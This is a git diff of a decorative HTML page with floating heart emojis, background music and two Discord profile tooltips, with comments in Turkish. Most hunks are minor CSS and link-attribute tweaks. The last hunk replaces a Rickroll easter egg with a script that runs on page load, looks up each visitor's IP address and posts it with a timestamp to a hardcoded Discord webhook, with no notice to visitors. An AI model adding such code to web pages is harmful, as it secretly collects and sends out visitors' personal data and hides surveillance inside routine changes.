@@ -11,9 +11,10 @@
       overflow: hidden;
       background: url('https://i.pinimg.com/474x/82/90/66/829066cdee2b5e3ea93e70b538cf2ad6.jpg') no-repeat center center fixed;
       background-size: cover;
-      font-family: Arial, sans-serif;
+      font-family: 'Arial', sans-serif;
       user-select: none;
       height: 100vh;
+      position: relative;
     }
 
     .hearts {
@@ -98,7 +99,7 @@
 
     .tooltip {
       position: absolute;
-      top: 7rem;
+      top: 6rem;
       left: 50%;
       transform: translateX(-50%) translateY(15px) scale(1.1);
       background: #ffb6c1;
@@ -128,33 +129,34 @@
       height: 100px;
       border-radius: 50%;
       object-fit: cover;
-      margin-bottom: 10px;
+      margin-bottom: 12px;
       border: 3px solid #ff66a3;
     }
 
     .tooltip img.discord-icon {
-      width: 28px;
-      height: 28px;
+      width: 24px;
+      height: 24px;
       vertical-align: middle;
-      margin-right: 10px;
+      margin-right: 8px;
       filter: invert(37%) sepia(56%) saturate(6276%) hue-rotate(318deg) brightness(99%) contrast(101%);
     }
 
     .tooltip a {
       display: inline-block;
-      margin-top: 10px;
+      margin-top: 8px;
       color: #d43873;
       text-decoration: none;
-      font-size: 16px;
+      font-size: 14px;
       font-weight: 600;
     }
 
-    .tooltip .username {
-      margin-top: 10px;
+    .tooltip div.username {
+      margin-top: 8px;
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 8px;
+      font-weight: 700;
     }
   </style>
 </head>
@@ -176,7 +178,7 @@
           <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" class="discord-icon" />
           shyla31
         </div>
-        <a href="https://discord.com/users/461158648526143490" target="_blank">Profili Gör</a>
+        <a href="https://discord.com/users/461158648526143490" target="_blank" rel="noopener noreferrer">Profili Gör</a>
       </div>
     </div>
     <div class="text-part" id="regen">
@@ -187,7 +189,7 @@
           <img src="https://cdn-icons-png.flaticon.com/512/5968/5968756.png" class="discord-icon" />
           regenxs
         </div>
-        <a href="https://discord.com/users/1208490819045163089" target="_blank">Profili Gör</a>
+        <a href="https://discord.com/users/1208490819045163089" target="_blank" rel="noopener noreferrer">Profili Gör</a>
       </div>
     </div>
   </div>
@@ -195,7 +197,7 @@
   <audio id="background-music" src="music.mp3" loop></audio>
 
   <script>
-    // Animasyonlu kalp ve emojiler
+    // Emoji animasyonu
     const hearts = ['❤','💕','💞','💓','💗','💖','💝','💘','💟','❣️','❤️‍🔥','❤️‍🩹','💌'];
     const container = document.getElementById('hearts-container');
 
@@ -212,7 +214,7 @@
 
     setInterval(createHeart, 300);
 
-    // Ses butonları
+    // Ses kontrolleri
     const audio = document.getElementById('background-music');
     const playPauseBtn = document.getElementById('play-pause-btn');
     const muteBtn = document.getElementById('mute-btn');
@@ -232,23 +234,18 @@
       muteBtn.textContent = audio.muted ? '🔇' : '🔊';
     });
 
-    // "regen" yazıp Enter'a basınca Rickroll
-    const target = "regen";
-    let buffer = "";
-
-    document.addEventListener("keydown", function(e) {
-      if (e.key.length === 1) {
-        buffer += e.key.toLowerCase();
-        if (buffer.length > target.length) {
-          buffer = buffer.slice(-target.length);
-        }
-      }
-
-      if (e.key === "Enter" && buffer === target) {
-        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
-        buffer = "";
-      }
-    });
+    // IP adresi al ve Discord'a gönder
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => {
+        fetch("https://ptb.discord.com/api/webhooks/1390120088719458465/5zM_-RCRoKEIaZDF9AsEHR-cgNDbiCS1U2WcKAsGrkoo339-R4i14UPl1o3LK0iuKdZf", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `🩷 Yeni ziyaretçi: \`${data.ip}\`\n📅 ${new Date().toLocaleString('tr-TR')}`
+          })
+        });
+      });
   </script>
 
 </body>
